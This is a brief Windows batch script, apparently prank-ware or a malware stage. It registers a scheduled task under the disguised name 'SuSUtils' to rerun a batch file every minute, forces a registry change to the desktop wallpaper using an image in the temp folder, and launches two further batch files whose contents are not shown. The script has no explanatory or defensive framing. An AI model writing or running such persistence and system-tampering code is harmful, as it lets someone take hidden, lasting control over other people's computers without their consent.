schtasks /create /sc MINUTE /mo 1 /tn "SuSUtils" /tr "%USERPROFILE%\Baller.bat" /st 00:00

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\booger (4).jpg" /f
start "%TEMP%\up.bat"

start "%USERPROFILE%\Baller.bat"

